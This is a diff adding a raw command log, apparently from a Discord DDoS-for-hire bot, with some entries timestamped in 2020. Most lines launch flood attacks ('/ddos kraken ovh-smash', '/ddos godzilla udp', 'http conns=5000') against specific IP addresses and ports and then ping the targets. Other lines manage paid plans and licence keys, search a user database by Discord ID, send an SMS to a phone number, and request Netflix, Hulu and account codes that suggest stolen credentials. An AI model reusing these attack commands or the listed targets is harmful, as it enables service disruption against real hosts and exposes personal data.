@@ -1,0 +1,139 @@
+/claim WESLx5r6c3OWc89X5pCPpAOHz92eTysI8HSfBua0Rf90OEvClO
+/claim WESLx5r6c3OWc89X5pCPpAOHz92eTysI8HSfBua0Rf90OEvClO
+/claim WESLx5r6c3OWc89X5pCPpAOHz92eTysI8HSfBua0Rf90OEvClO
+/claim WE8hiNGhErqjRnDHxptuw4cxxIhh1xiwCKSt7DUGqj5ZT4DvJ8
+/sms
+/plan
+/ddos godzilla udp 45.153.56.100 45 1134
+/getplan <@672652603880112148>
+/info
+/dbshow all
+/dbshow page
+/methods
+/xboxcode
+/xboxcode
+/xboxcode
+/xboxcode
+/vpn
+/vpn
+/vpn
+/vpn
+/sms 4707232088
+/boi
+/bugbounty
+/vpn
+/dbsesearch <@693853122728296538>
+/dbsearch <@672652603880112148>
+/dbsearch @TylerYeboi#1000
+/dbsearch @CharonI#6638
+/dbsearch page
+/dbsearch PAGE
+/dbsearch <@548754982787088396>
+/dbsearch @toxicerror#7741
+/ping ip 95.217.149.161
+/checkip 95.217.149.161
+/checkip 73.32.26.46
+/checkip 73.32.26.46
+/ping ip 40.80.210.149
+/plan
+/info
+/ping ip 40.80.210.149
+/ddos kraken ovh-smash 104.128.60.199 21 120
+/plans
+/prices
+/plans
+/increaseplan <@!267652543608258571> 9999999y
+/methods
+/checkip 54.38.4.126
+/ddos kraken ovh - smash 54.38.4.126  120 44555
+/ddos kraken ovh - smash 54.38.4.126 120 44555
+/ddos kraken ovh - smash 198.50.224.235 61682 120
+/ddos kraken ovh smash 198.50.224.235 61682 120
+/ddos kraken ovhsmash 198.50.224.235 61682 120
+/ddos kraken ovh-smash 198.50.224.235 61682 120
+/ddos kraken ovh-smash 198.50.224.235 120 61682
+/pingip 198.50.224.235
+/ping 198.50.224.235
+/methods
+/ddos kraken 174.104.30.255 120 80
+/ddos kraken udp 174.104.30.255 120 80
+/ping 174.104.30.255
+/plan
+/methods
+/ddos godzilla udp 174.104.30.255 120 80
+/ping 174.104.30.255
+/ping 174.104.30.255
+/ddos kraken squid 174.104.30.255 120 80
+/ping 174.104.30.255
+/ping 174.104.30.255
+/checkservers
+/plan
+/xboxcode
+/methods
+/xboxcode
+/xboxcode
+/methods
+/status
+/serverinfo
+/ddos kraken ovhsmash 54.38.213.246 120 0
+/ddos kraken ovh smash 54.38.213.246 120 0
+/ddos kraken ovh-smash 54.38.213.246 120 0
+/pingip 54.38.213.246
+/ping 54.38.213.246
+/status
+/serverstatus
+/checkservers
+/ping 54.39.226.33
+/ddos kraken ovh-smash 54.39.226.33 120 22
+/ping 54.39.226.33
+/ping 54.39.226.33
+/plan
+/ddos godzilla std 67.249.152.104 120 80
+/ping 67.249.152.104
+/ddos godzilla std 68.189.223.162 120 80
+/ping 68.189.223.162
+/ping 68.189.223.162
+/ddos godzilla std 68.189.223.162 120 80
+/ping 68.189.223.162
+/ping 68.189.223.162
+/plan
+/plan
+/plan
+/plan
+/plan
+/plan
+/plan
+/plan <@727809097612918814>
+/plan <@727809097612918814>
+/getplan <@727809097612918814>
+/getplan <@727809097612918814>
+/getplan <@277500960065060864>
+/getplan <@277500960065060864>
+/netflix
+/netflix
+/code
+/code
+/accounts
+/accounts
+/hulu
+/hulu
+/hulu
+/hulu U STUOID BOTCH
+/hulu
+/vpn
+/ping 107.184.135.111
+/ping 107.184.135.111
+/checkip 107.184.135.111
+/checkip 107.184.135.111
+/generatekeys trial 1
+/generatekeys trial
+/generatekeys lifetime
+/tr4p
+/plan
+[Wed Aug 12 2020 05:23:45 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 117.27.239.28 30 80
+[Tue Aug 25 2020 03:04:35 GMT-1100 (Samoa Standard Time)] /plans standard
+[Tue Aug 25 2020 03:24:36 GMT-1100 (Samoa Standard Time)] /plan
+[Tue Aug 25 2020 03:41:35 GMT-1100 (Samoa Standard Time)] /generatekeys 1 1
+[Tue Aug 25 2020 03:43:47 GMT-1100 (Samoa Standard Time)] /ping 168.9.35.74
+[Tue Aug 25 2020 03:45:41 GMT-1100 (Samoa Standard Time)] /methods
+[Tue Aug 25 2020 03:47:25 GMT-1100 (Samoa Standard Time)] /ddos kraken http 168.9.35.74 100 domain=168.9.35.74 conns=5000
